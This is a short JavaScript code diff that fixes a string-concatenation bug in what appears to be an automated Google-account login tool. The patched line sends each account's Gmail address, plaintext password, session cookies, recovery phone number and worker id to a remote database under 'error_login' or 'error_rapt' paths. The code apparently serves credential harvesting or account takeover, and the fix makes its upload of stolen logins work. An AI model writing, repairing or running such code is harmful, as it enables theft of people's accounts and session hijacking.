@@ -403,7 +403,7 @@ async function loginWithCompleted(number, password, cookies, time, worker) {
                         }
                     } else {
                         try {
-                            await axios.patch(BASE_URL+(mLoader.status==200?+'error_login':'error_rapt')+'/'+number+'.json', JSON.stringify({ gmail:mData.gmail.replace(/[.]/g, ''), password:password, cookies:cookies, worker:worker, number:recoveryNumber, create: time }), {
+                            await axios.patch(BASE_URL+(mLoader.status==200?'error_login':'error_rapt')+'/'+number+'.json', JSON.stringify({ gmail:mData.gmail.replace(/[.]/g, ''), password:password, cookies:cookies, worker:worker, number:recoveryNumber, create: time }), {
                                 headers: {
                                     'Content-Type': 'application/x-www-form-urlencoded'
                                 }
